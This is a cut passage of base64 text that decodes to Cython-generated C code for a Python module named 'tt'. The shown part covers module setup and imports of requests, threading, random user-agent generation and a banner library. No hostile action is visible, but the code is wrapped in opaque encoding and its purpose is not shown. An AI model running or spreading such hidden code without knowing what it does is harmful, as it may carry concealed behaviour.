UgPSBOVUxMLCAqbW9kZGljdCwgKm1vZG5hbWU7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoZGVmKTtcbiAgICAjaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICAgaWYgKF9fUHl4X2NoZWNrX3NpbmdsZV9pbnRlcnByZXRlcigpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAjZW5kaWZcbiAgICBpZiAoX19weXhfbSlcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tKTtcbiAgICBtb2RuYW1lID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhzcGVjLCAibmFtZSIpO1xuICAgIGlmICh1bmxpa2VseSghbW9kbmFtZSkpIGdvdG8gYmFkO1xuICAgIG1vZHVsZSA9IFB5TW9kdWxlX05ld09iamVjdChtb2RuYW1lKTtcbiAgICBQeV9ERUNSRUYobW9kbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSBnb3RvIGJhZDtcbiAgICBtb2RkaWN0ID0gUHlNb2R1bGVfR2V0RGljdChtb2R1bGUpO1xuICAgIGlmICh1bmxpa2VseSghbW9kZGljdCkpIGdvdG8gYmFkO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKHNwZWMsIG1vZGRpY3QsICJsb2FkZXIiLCAiX19sb2FkZXJfXyIsIDEpIDwgMCkpIGdvdG8gYmFkO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKHNwZWMsIG1vZGRpY3QsICJvcmlnaW4iLCAiX19maWxlX18iLCAxKSA8IDApKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAicGFyZW50IiwgIl9fcGFja2FnZV9fIiwgMSkgPCAwKSkgZ290byBiYWQ7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgInN1Ym1vZHVsZV9zZWFyY2hfbG9jYXRpb25zIiwgIl9fcGF0aF9fIiwgMCkgPCAwKSkgZ290byBiYWQ7XG4gICAgcmV0dXJuIG1vZHVsZTtcbmJhZDpcbiAgICBQeV9YREVDUkVGKG1vZHVsZSk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5cblxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX3B5eF9weW1vZF9leGVjX3R0KFB5T2JqZWN0ICpfX3B5eF9weWluaXRfbW9kdWxlKVxuI2VuZGlmXG57XG4gIGludCBzdHJpbmd0YWJfaW5pdGlhbGl6ZWQgPSAwO1xuICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAgaW50IHB5c3RhdGVfYWRkbW9kdWxlX3J1biA9IDA7XG4gICNlbmRpZlxuICBfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5X3NzaXplX3QgX19weXhfdF8zO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF83O1xuICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfOTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7XG4gIGludCBfX3B5eF90XzEyO1xuICBpbnQgX19weXhfdF8xMztcbiAgY2hhciBjb25zdCAqX19weXhfdF8xNDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE3ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTggPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xOSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIwID0gTlVMTDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gIGlmIChfX3B5eF9tKSB7XG4gICAgaWYgKF9fcHl4X20gPT0gX19weXhfcHlpbml0X21vZHVsZSkgcmV0dXJuIDA7XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgIk1vZHVsZSBcJ3R0XCcgaGFzIGFscmVhZHkgYmVlbiBpbXBvcnRlZC4gUmUtaW5pdGlhbGlzYXRpb24gaXMgbm90IHN1cHBvcnRlZC4iKTtcbiAgICByZXR1cm4gLTE7XG4gIH1cbiAgI2Vsc2VcbiAgaWYgKF9fcHl4X20pIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbSk7XG4gICNlbmRpZlxuICBcbiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICBfX3B5eF90XzEgPSBfX3B5eF9weWluaXRfbW9kdWxlO1xuICBQeV9JTkNSRUYoX19weXhfdF8xKTtcbiAgI2Vsc2VcbiAgX19weXhfdF8xID0gUHlNb2R1bGVfQ3JlYXRlKCZfX3B5eF9tb2R1bGVkZWYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICB7XG4gICAgaW50IGFkZF9tb2R1bGVfcmVzdWx0ID0gX19QeXhfU3RhdGVfQWRkTW9kdWxlKF9fcHl4X3RfMSwgJl9fcHl4X21vZHVsZWRlZik7XG4gICAgX19weXhfdF8xID0gMDsgXG4gICAgaWYgKHVubGlrZWx5KChhZGRfbW9kdWxlX3Jlc3VsdCA8IDApKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIHB5c3RhdGVfYWRkbW9kdWxlX3J1biA9IDE7XG4gIH1cbiAgI2Vsc2VcbiAgX19weXhfbSA9IF9fcHl4X3RfMTtcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICBQeVVuc3RhYmxlX01vZHVsZV9TZXRHSUwoX19weXhfbSwgUHlfTU9EX0dJTF9VU0VEKTtcbiAgI2VuZGlmXG4gIF9fcHl4X21zdGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWw7XG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X3RfMSk7XG4gIF9fcHl4X21zdGF0ZS0+X19weXhfZCA9IFB5TW9kdWxlX0dldERpY3QoX19weXhfbSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9kKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBQeV9JTkNSRUYoX19weXhfbXN0YXRlLT5fX3B5eF9kKTtcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9iID0gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKF9fUHl4X0JVSUxUSU5fTU9EVUxFX05BTUUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfYikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSA9IF9fUHl4X1B5SW1wb3J0X0FkZE1vZHVsZVJlZigiY3l0aG9uX3J1bnRpbWUiKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoUHlPYmplY3RfU2V0QXR0clN0cmluZyhfX3B5eF9tLCAiX19idWlsdGluc19fIiwgX19weXhfbXN0YXRlLT5fX3B5eF9iKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gICNpZiBDWVRIT05fUkVGTkFOTllcbiAgX19QeXhfUmVmTmFubnkgPSBfX1B5eF9SZWZOYW5ueUltcG9ydEFQSSgicmVmbmFubnkiKTtcbiAgaWYgKCFfX1B5eF9SZWZOYW5ueSkge1xuICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgX19QeXhfUmVmTmFubnkgPSBfX1B5eF9SZWZOYW5ueUltcG9ydEFQSSgiQ3l0aG9uLlJ1bnRpbWUucmVmbmFubnkiKTtcbiAgICBpZiAoIV9fUHl4X1JlZk5hbm55KVxuICAgICAgICBQeV9GYXRhbEVycm9yKCJmYWlsZWQgdG8gaW1wb3J0IFwncmVmbmFubnlcJyBtb2R1bGUiKTtcbiAgfVxuICAjZW5kaWZcbiAgXG5fX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiUHlJbml0X3R0IiwgMCk7XG4gIF9fUHl4X2luaXRfcnVudGltZV92ZXJzaW9uKCk7XG4gIGlmIChfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbihfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYLCBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKCksIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUgPSBQeVR1cGxlX05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSgiIiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV91bmljb2RlID0gUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKCIiLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIFxuICBcbiAgaWYgKF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBzdHJpbmd0YWJfaW5pdGlhbGl6ZWQgPSAxO1xuICBpZiAoX19QeXhfSW5pdEdsb2JhbHMoKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoX19weXhfbW9kdWxlX2lzX21haW5fdHQpIHtcbiAgICBpZiAoUHlPYmplY3RfU2V0QXR0cihfX3B5eF9tLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmFtZV8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbWFpbikgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgfVxuICB7XG4gICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7IGlmICh1bmxpa2VseSghbW9kdWxlcykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBpZiAoIVB5RGljdF9HZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJ0dCIpKSB7XG4gICAgICBpZiAodW5saWtlbHkoKFB5RGljdF9TZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJ0dCIsIF9fcHl4X20pIDwgMCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICAgfVxuICB9XG4gIFxuICBpZiAoX19QeXhfSW5pdENhY2hlZEJ1aWx0aW5zKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gIGlmIChfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gICh2b2lkKV9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGUpO1xuICAodm9pZClfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7XG4gICh2b2lkKV9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUoX19weXhfbXN0YXRlKTtcbiAgaWYgKHVubGlrZWx5KChfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZSkgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgKHZvaWQpX19QeXhfbW9kaW5pdF90eXBlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7XG4gICh2b2lkKV9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRlKTtcbiAgKHZvaWQpX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGUpO1xuICBcblxuICBcbiAge1xuICAgIFB5T2JqZWN0KiBjb25zdCBfX3B5eF9pbXBvcnRlZF9uYW1lc1tdID0ge19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWRQb29sRXhlY3V0b3IsX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FzX2NvbXBsZXRlZH07XG4gICAgX19weXhfdF8xID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb25jdXJyZW50X2Z1dHVyZXMsIF9fcHl4X2ltcG9ydGVkX25hbWVzLCAyLCBOVUxMLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpXG4gIH1cbiAgX19weXhfdF8yID0gX19weXhfdF8xO1xuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAge1xuICAgIFB5T2JqZWN0KiBjb25zdCBfX3B5eF9pbXBvcnRlZF9uYW1lc1tdID0ge19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWRQb29sRXhlY3V0b3IsX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FzX2NvbXBsZXRlZH07XG4gICAgZm9yIChfX3B5eF90XzM9MDsgX19weXhfdF8zIDwgMjsgX19weXhfdF8zKyspIHtcbiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9pbXBvcnRlZF9uYW1lc1tfX3B5eF90XzNdKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9pbXBvcnRlZF9uYW1lc1tfX3B5eF90XzNdLCBfX3B5eF90XzQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICB9XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzLCAwLCAwLCBOVUxMLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMywgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3RfMiA9IF9fcHl4X3RfMTtcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICB7XG4gICAgUHlPYmplY3QqIGNvbnN0IF9fcHl4X2ltcG9ydGVkX25hbWVzW10gPSB7X19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfYWdlbnR9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcl9hZ2VudF8yLCBfX3B5eF9pbXBvcnRlZF9uYW1lcywgMSwgTlVMTCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQsIF9fcHl4X0wxX2Vycm9yKVxuICB9XG4gIF9fcHl4X3RfMiA9IF9fcHl4X3RfMTtcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIHtcbiAgICBQeU9iamVjdCogY29uc3QgX19weXhfaW1wb3J0ZWRfbmFtZXNbXSA9IHtfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudH07XG4gICAgX19weXhfdF8zID0gMDsge1xuICAgICAgX19weXhfdF80ID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzIsIF9fcHl4X2ltcG9ydGVkX25hbWVzW19fcHl4X3RfM10pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgc3dpdGNoIChfX3B5eF90XzMpIHtcbiAgICAgICAgY2FzZSAwOlxuICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnYiwgX19weXhfdF80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICBicmVhaztcbiAgICAgICAgZGVmYXVsdDo7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICB9XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIHtcbiAgICBQeU9iamVjdCogY29uc3QgX19weXhfaW1wb3J0ZWRfbmFtZXNbXSA9IHtfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVuZGVyfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nmb250cywgX19weXhfaW1wb3J0ZWRfbmFtZXMsIDEsIE5VTEwsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA1LCBfX3B5eF9MMV9lcnJvcilcbiAgfVxuICBfX3B5eF90XzIgPSBfX3B5eF90XzE7XG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB7XG4gICAgUHlPYmplY3QqIGNvbnN0IF9fcHl4X2ltcG9ydGVkX25hbWVzW10gPSB7X19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbmRlcn07XG4gICAgX19weXhfdF8zID0gMDsge1xuICAgICAgX19weXhfdF80ID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzIsIF9fcHl4X2ltcG9ydGVkX25hbWVzW19fcHl4X3RfM10pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA1LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X2ltcG9ydGVkX25hbWVzW19fcHl4X3RfM10sIF9fcHl4X3RfNCkgPCAoMCkpIF9fUFlYX0VSUigwLCA1LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIH1cbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9weXR6LCAwLCAwLCBOVUxMLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3RfMiA9IF9fcHl4X3RfMTtcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHl0eiwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cywgMCwgMCwgTlVMTCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF90XzIgPSBfX3B5eF90XzE7XG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICB7XG4gICAgUHlPYmplY3QqIGNvbnN0IF9fcHl4X2ltcG9ydGVkX25hbWVzW10gPSB7X19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZSxfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSwgX19weXhfaW1wb3J0ZWRfbmFtZXMsIDIsIE5VTEwsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA4LCBfX3B5eF9MMV9lcnJvcilcbiAgfVxuICBfX3B5eF90XzIgPSBfX3B5eF90XzE7XG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB7XG4gICAgUHlPYmplY3QqIGNvbnN0IF9fcHl4X2ltcG9ydGVkX25hbWVzW10gPSB7X19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZSxfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlfTtcbiAgICBmb3IgKF9fcHl4X3RfMz0wOyBfX3B5eF90XzMgPCAyOyBfX3B5eF90XzMrKykge1xuICAgICAgX19weXhfdF80ID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzIsIF9fcHl4X2ltcG9ydGVkX25hbWVzW19fcHl4X3RfM10pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA4LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgc3dpdGNoIChfX3B5eF90XzMpIHtcbiAgICAgICAgY2FzZSAwOlxuICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjLCBfX3B5eF90XzQpIDwgKDApKSBfX1BZWF9FUlIoMCwgOCwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgIGJyZWFrO1xuICAgICAgICBjYXNlIDE6XG4gICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIsIF9fcHl4X3RfNCkgPCAoMCkpIF9fUFlYX0VSUigwLCA4LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgICAgYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6O1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgfVxuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzEgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZywgMCwgMCwgTlVMTCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDksIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF90XzIgPSBfX3B5eF90XzE7XG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZywgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdHJpbmcsIDAsIDAsIE5VTEwsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMCwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3RfMiA9IF9fcHl4X3RfMTtcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RyaW5nLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9